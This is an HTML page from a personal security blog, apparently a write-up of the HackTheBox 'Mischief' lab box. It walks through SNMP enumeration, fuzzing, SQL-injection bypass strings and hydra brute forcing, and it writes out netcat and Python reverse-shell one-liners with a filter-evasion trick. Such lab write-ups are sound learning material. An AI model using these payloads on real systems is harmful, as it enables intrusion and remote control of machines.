@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DocDock Documentation</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-01-07T01:02:29 EST">
+<title>Mischief :: DocDock Documentation</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/mischief/_index.md/">
+    
+      <header>
+  <div class="logo">
+    
+	
+  
+    
+
+<h2 id="chickenpwny">ChickenPwny</h2>
+
+  
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/chickenpwny"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock/archive/master.zip"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+          <li data-nav-id="/" class="dd-item">
+          <a href="/">
+            <i class="fa fa-fw fa-home"></i>
+          </a>
+          </li>
+    <li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+      <div>
+      <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+      <div>
+      <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+      <div>
+      <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+      <div>
+      <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+        </ul>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/github/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/github/hugopowershell/" class="dd-item">
+        <div>
+          <a href="/github/hugopowershell/">
+            Hugo/Github/Power
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+      <div>
+      <a href="/hackthebox/">HackTheBox</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+      <div>
+      <a href="/hackthebox/boxes/">Boxes</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+      <div>
+      <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+      <div>
+      <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+      <li data-nav-id="/hackthebox/boxes/mischief/_index.md/" class="dd-item active">
+        <div>
+          <a href="/hackthebox/boxes/mischief/_index.md/">
+            Mischief
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+    <li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+      <div>
+      <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+      <div>
+      <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+      <div>
+      <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+      <div>
+      <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+        <div>
+          <a href="/hackthebox/challenges/bloodhound/">
+            
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+        </ul>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/help/" class="dd-item
+        ">
+      <div>
+      <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+      <li data-nav-id="/tools/bloodhound/" class="dd-item">
+        <div>
+          <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/tools/ftp/" class="dd-item">
+        <div>
+          <a href="/tools/ftp/">
+            FTP
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+    <li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+    <li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+      <li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+        <div>
+          <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+    <li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/webapp/wfuzz/">WFUZZ</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+        </ul>
+    </li>
+    <li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+      <div>
+      <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+        <ul>
+    <li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+      <div>
+      <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+      </div>
+    </li>
+        </ul>
+    </li>
+        </ul>
+    </li>
+
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/github/" >
+   GitHub</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/mischief/_index.md/"  selected>-- Mischief</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>Mischief</h1>
+    
+    
+    
+    
+
+<p>THIS IS A SUMMARY OF IPPSEC VIDEO &amp; 0XDF GUIDE.</p>
+
+<p>watch the ippsec video <a href="https://www.youtube.com/watch?v=GKo6xoB1g4Q">https://www.youtube.com/watch?v=GKo6xoB1g4Q</a></p>
+
+<p>read this guide <a href="https://0xdf.gitlab.io/2019/01/05/htb-mischief.html">https://0xdf.gitlab.io/2019/01/05/htb-mischief.html</a></p>
+
+<p>Summary, this box highlights securing ipv6.</p>
+
+<p>The quality of the phpsession tokens is exellent damnit.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>-v print output as it find it</p>
+
+<p>-max-retries 0 &lt;&ndash; save for later</p>
+
+<pre><code># Nmap 7.70 scan initiated Tue Jan  1 16:00:09 2019 as: nmap -sV -sC -p- -Pn -oA total -T5 10.10.10.92
+Nmap scan report for 10.10.10.92
+Host is up (0.14s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
+| http-auth: 
+| HTTP/1.0 401 Unauthorized\x0D
+|_  Basic realm=Test
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre>
+
+<h3 id="tcp-connect">TCP - connect</h3>
+
+<pre><code>22/tcp    open     ssh                                                                                                                               
+80/tcp    open     http                                                                                                                              
+1857/tcp  filtered datacaptor                                                                                                                        
+2308/tcp  filtered sdhelp                                                                                                                            
+3465/tcp  filtered edm-mgr-cntrl                                                                                                                    
+3541/tcp  filtered voispeed-port  
+</code></pre>
+
+<h3 id="udp">UDP</h3>
+
+<pre><code>Not shown: 994 closed ports
+PORT      STATE         SERVICE    VERSION
+3/udp     open|filtered tcpwrapped
+80/udp    open|filtered tcpwrapped
+17219/udp open|filtered chipper
+19193/udp open|filtered unknown
+31625/udp open|filtered unknown
+52225/udp open|filtered unknown
+</code></pre>
+
+<p><a href="https://security.stackexchange.com/questions/23407/how-to-bypass-tcpwrapped-with-nmap-scan">https://security.stackexchange.com/questions/23407/how-to-bypass-tcpwrapped-with-nmap-scan</a></p>
+
+<p>&ldquo;<code>tcpwrapped</code>&rdquo; refers to <code>tcpwrapper</code>, a host-based network access control program on Unix and Linux. When Nmap labels something <code>tcpwrapped</code>,  it means that the behavior of the port is consistent with one that is  protected by tcpwrapper. Specifically, it means that a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data.</p>
+
+<h3 id="snmpwalk">SNMPWALK</h3>
+
+<p>First to make it easier, install snmp-mibs-downloader a psuedo api. Instead of supplying the string of numbers supply something easier to to understand.</p>
+
+<p><a href="https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#tool-setup">https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#tool-setup</a></p>
+
+<p>Messed up here to blindsided did n&rsquo;t fully enumerate snmp. Theres a huge oid list interesting ones will let you read system processes</p>
+
+<p><a href="http://cric.grenoble.cnrs.fr/Administrateurs/Outils/MIBS/?oid=1.3.6.1.2.1.4.34">REFERENCE</a></p>
+
+<p>snmpwalk -v 2c -c public 10.10.10.92 ipAddressTable</p>
+
+<p>snmpwalk -v 2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3.2</p>
+
+<p>snmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable</p>
+
+<p>snmpwalk -v 2c -c public 10.10.10.92 1.3.6.1.2.1.25.4.2</p>
+
+<p>snmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep loki</p>
+
+<p>HOST-RESOURCES-MIB::hrSWRunParameters.601 = STRING: &ldquo;-c /home/loki/hosted/webstart.sh&rdquo;
+HOST-RESOURCES-MIB::hrSWRunParameters.609 = STRING: &ldquo;/home/loki/hosted/webstart.sh&rdquo;
+HOST-RESOURCES-MIB::hrSWRunParameters.619 = STRING: &ldquo;-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki &ndash;dir /home/loki/hosted/&rdquo;</p>
+
+<p>snmpwalk -c public -v2c 10.10.10.92 | tee snmpwalk-mib.out</p>
+
+<p>tee prints the output as it goes</p>
+
+<p>CREDS</p>
+
+<p>User: loki Pass: godofmischiefisloki</p>
+
+<p>IPV6 ADDRESS</p>
+
+<p>iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
+iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.143.244.163 = INTEGER: 2
+iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.143.244.163 = INTEGER: 2</p>
+
+<p>ssh into another box on the htb you can do the link local address ipv6 has a link local and routerable addr if your on the same layer 2 link you can access it.</p>
+
+<h3 id="enyx-https-github-com-trickster0-enyx-but-a"><a href="https://github.com/trickster0/Enyx">ENYX</a> but a</h3>
+
+<p>python enyx.py 2c public 10.10.10.92</p>
+
+<p>[+] Snmpwalk found.
+[+] Grabbing IPv6.
+[+] Loopback -&gt; 0000:0000:0000:0000:0000:0000:0000:0001
+[+] Unique-Local -&gt; dead:beef:0000:0000:0250:56ff:fe8f:f4a3
+[+] Link Local -&gt; fe80:0000:0000:0000:0250:56ff:fe8f:f4a3</p>
+
+<p>BruteForcing Community Strings</p>
+
+<p>update onesixtyone</p>
+
+<pre><code>onesixtyone -c /seclist/common-snmp addr
+
+./onesixtyone -c /opt/htb/wordlist/seclist
+/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.92
+
+Scanning 1 hosts, 122 communities
+10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/mischief/firstwebpage_creds.PNG" alt="firstwebpage_creds" /></p>
+
+<h3 id="second-set-of-credentials">Second set of credentials</h3>
+
+<p>user: loki | Pass: trickeryanddeceit</p>
+
+<pre><code>root@kali:~/hackthebox/mischief-10.10.10.92# curl -s -6 -X POST &quot;http://[dead:beef::250:56ff:feb2:7cff]:80/&quot; -H &quot;Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d&quot; -d &quot;command=nc&quot;
+</code></pre>
+
+<h3 id="gobuster">GOBUSTER</h3>
+
+<p>/login.php (Status: 200)
+/assets (Status: 301)
+/index.php (Status: 200)
+/database.php (Status: 200)
+/logout.php (Status: 302</p>
+
+<p><img src="../../../../Hugo/sites/blog/static/images/mischief/assets.PNG" alt="assets" /></p>
+
+<p>wfuzz -hl 28 -c -b &ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t&rdquo; -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u &ldquo;<a href="http://loki.htb/login.php?FUZZ=whoami&quot;">http://loki.htb/login.php?FUZZ=whoami&quot;</a></p>
+
+<p>wfuzz -c -b &ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t&rdquo; -w /opt/htb/wordlist/seclist/Fuzzing/Command-Injection-commix.txt -u &ldquo;<a href="http://loki.htb/login.php?login=FUZZ&quot;">http://loki.htb/login.php?login=FUZZ&quot;</a></p>
+
+<p>wfuzz &ndash;hw 32 -c -b &ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t&rdquo; -w /opt/htb/wordlist/seclist/Fuzzing/LFI-JHADDIX.txt -u &ldquo;<a href="http://loki.htb/assets/FUZZ&quot;">http://loki.htb/assets/FUZZ&quot;</a></p>
+
+<h4 id="sql">SQL</h4>
+
+<p>perhaps submit query when submiting the creds at the login page are vulnerable to sql injection</p>
+
+<p><a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html">http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html</a></p>
+
+<pre><code>'or&quot;='
+
+') or true--
+') or ('')=('
+') or 1--
+') or ('x')=('
+</code></pre>
+
+<p>The big mistake I made with wfuzz was not fuzzing POST request and only using GET request. I also missed allot of the snmpwalk hints.</p>
+
+<h4 id="bad">BAD</h4>
+
+<pre><code>wfuzz -hl 28 -c -b &quot;PHPSESSID=je830qer33ef3jvs3h140o2n8t&quot; -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u &quot;http://loki.htb/login.php?FUZZ=whoami&quot;
+</code></pre>
+
+<h4 id="good">GOOD</h4>
+
+<pre><code>wfuzz -c -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -d &quot;FUZZ=junk&quot; --hh 403 'http://loki.htb/'
+</code></pre>
+
+<h4 id="output">OUTPUT</h4>
+
+<pre><code>000207:  C=200     20 L       35 W          436 Ch        &quot;command&quot;
+000546:  C=200     20 L       31 W          403 Ch        &quot;left&quot;
+</code></pre>
+
+<p>The supplied creds from the last webpage wont work in any combination. Using hydra to enumerate possible users, will return <em>administrator</em>. The password file should include both of the password from the previous steps (godofmischiefisloki, trickeryanddeceit), using Seclists top-usersnames-shortlist for the user enumeration.</p>
+
+<h4 id="hydra">HYDRA</h4>
+
+<pre><code>hydra loki.htb -L /opt/htb/wordlist/seclist/Usernames/top-usernames-shortlist.txt -P passwords http-form-post &quot;/login.php:user=^USER^&amp;password=^PASS^:Sorry, those credentials do not match&quot;
+
+user: administrator pass: trickeryanddeceit
+
+-L word list
+
+-P password -
+
+http-form-port the type of request
+
+after ^PASS^ notice : those are the parameter it will look for when it fails.
+</code></pre>
+
+<p>WebDev</p>
+
+<p>It pipes user input into /dev/nul but it can only handle one command using two commands it will pipe the last to /dev/null and will execute the first line. credentials didn&rsquo;t work because ls was strictly compared so any iterance of ls will be blacklisted</p>
+
+<p><img src="https://chickenpwny.github.io/images/mischief/command_exec1.PNG" alt="command_exec1" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/mischief/command_exec2.PNG" alt="command_exec2" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/mischief/command_exec3.PNG" alt="command_exec3" /></p>
+
+<p>ippsec used rm netcat reverse shelll and to bypass the waf he used a question mark.</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|n? 10.0.0.1 1234 &gt;/tmp/f
+it wont allow ipv4 so have to also use -6 switch and use ipv6 addr
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|n? -6 dead:beef:2::100c 9056 &gt;/tmp/f
+</code></pre>
+
+<p>So this is from 0xdf guide, save this for a later ctf.</p>
+
+<pre><code>#/bin/bash
+#// variable
+command_file=$1
+#// for each command in file do curl cmd
+for cmd in $(cat ${command_file}); do
+    curl -s -6 -X POST &quot;http://[dead:beef::250:56ff:feb2:7cff]:80/&quot; -H &quot;Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d&quot; -d &quot;command=${cmd}&quot; | grep -q &quot;Command is not allowed.&quot;
+#// if the previous command returns one if true. 
+#// (grep) -e regex -q quiet...suppress all normal output
+#// $? is the exit code from the previous command. so in this case,grep
+#// grep returns 1 if it doesn't find the string you're looking for
+    if [ $? -eq 1 ]; then
+#// echo -e \e enable parsing of the escape sequences [49m deals with #// the Default background color  
+        echo -e &quot;\e[42m${cmd}\e[49m allowed&quot;;
+    else
+        echo -e &quot;\e[41m${cmd}\e[49m blocked&quot;;
+    fi;
+done
+</code></pre>
+
+<p>This script sets two variables ip and cmd will ask for input allow us to test for different commands</p>
+
+<p>dead:beef::250:56ff:fe8f:f4a3</p>
+
+<pre><code>#!/bin/bash
+
+ip=$1
+cmd=$2
+curl -s -6 -X POST &quot;http://[${ip}]:80/&quot; -d &quot;command=${cmd};&quot; | grep -F &quot;&lt;/html&gt;&quot; -A 10 | grep -vF -e &quot;&lt;/html&gt;&quot; -e &quot;Command was executed succesfully!&quot;
+</code></pre>
+
+<p>things to note escapes were added after quotes socket was change from ipv4 to 6 socket,AF_INET6</p>
+
+<p>./cmd.sh ipv6_addr_changeme &ldquo;python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\&ldquo;YOUR_IPV6_ADDR_CHANGEME\&ldquo;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&ldquo;/bin/sh\&ldquo;,\&ldquo;-i\&ldquo;]);&lsquo;&rdquo;</p>
+
+<p>NetCat</p>
+
+<p>ip addr |grep inet6     #// use the scope global address</p>
+
+<p>nc -nv &ndash;listen Your_ipv6_addr 443</p>
+
+<p>Limited access with a www-data users. get the file called creds and assh into the box</p>
+
+<p>lokiisthebestnorsegod</p>
+
+<p>ssh loki@10.10.10.92</p>
+
+<p>ROOT</p>
+
+<p>Some files to check next time su isn&rsquo;t available. /etc/pam.d/su handles authentication for su, next file access control lists (facl) getfacl.</p>
+
+<p>three options for root first since loki can&rsquo;t su but www-data can su. second use systemd-run to get a reverse shell as root using ipv6.</p>
+
+<p><a href="https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#option-1---use-www-data-shell">https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#option-1---use-www-data-shell</a></p>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper"> <i class="fa fa-chevron-left"></i><label>CrimeStopper</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/poison/" title="Poison" style="margin-right: 0px;"><label>Poison</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/HackTheBox/Boxes/Mischief/_index.md.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
